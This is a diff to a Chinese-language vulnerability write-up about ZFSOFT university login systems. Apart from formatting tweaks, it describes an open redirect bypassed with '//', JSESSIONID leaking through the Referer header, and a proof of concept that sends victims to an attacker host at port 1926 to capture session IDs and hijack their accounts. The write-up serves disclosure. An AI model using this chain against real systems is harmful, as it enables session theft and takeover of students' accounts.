@@ -26,11 +26,11 @@
     Server: ZFSOFT.Inc
     Set-Cookie: kc@x.edu.cn=<cookie>;expires=Mon, 10-Jun-2019 20:14:30 GMT;path=/
 
-可以看到这里的`Location`就是我们开始访问的地址，既然可以控制这个我就试了下不过没有CRLF Injection :(
+可以看到这里的`Location`就是我们开始访问的地址，既然可以控制这个我就试了下不过没有CRLF Injection :(\
 然而我们还可以用`//`例如`http://x.edu.cn//www.baidu.com`绕过限制从而达到任意网址跳转
 
 ## Referer泄漏
-我们已经可以控制登陆成功后的重定向地址了，JAVA会在首次访问的时候设置JSESSIONID。然而由于，Java Spring默认的奇怪操作会把它的值显示在URL中比如`http://x.edu.cn/xtgl/login_slogin.html;jsessionid=<id>`，这样认证的时候HTTP头中的Referer就会泄漏掉它。
+我们已经可以控制登陆成功后的重定向地址了，JAVA会在首次访问的时候设置JSESSIONID。然而由于Java Spring默认的奇怪操作会把它的值显示在URL中比如`http://x.edu.cn/xtgl/login_slogin.html;jsessionid=<id>`，这样认证的时候HTTP头中的Referer就会泄漏掉它。\
 **有些学校不使用内建的登陆系统（比如采用OAuth2），这时候有可能会在认证的时候覆盖掉Referer导致攻击失效。经测试如OAuth支持SSO，在已经登陆的前提下可能不会覆盖Referer，需要具体测试。**
 
 ## PoC
@@ -43,7 +43,7 @@
 
     python2 server.py
 
-目标URL: `http://x.edu.cn//<ip>:1926`
+目标URL: `http://x.edu.cn//<ip>:1926`\
 受害者访问此URL，就会被重定向到首页（从这个时候起URL是看不出任何异常的），认证通过后会被重定向到`<ip>:1926`，我们可以从服务端的输出看到JSESSIONID。
 替换一下Cookie即可登录受害者账户，可结合其他漏洞提权等等，此处不公开。
 
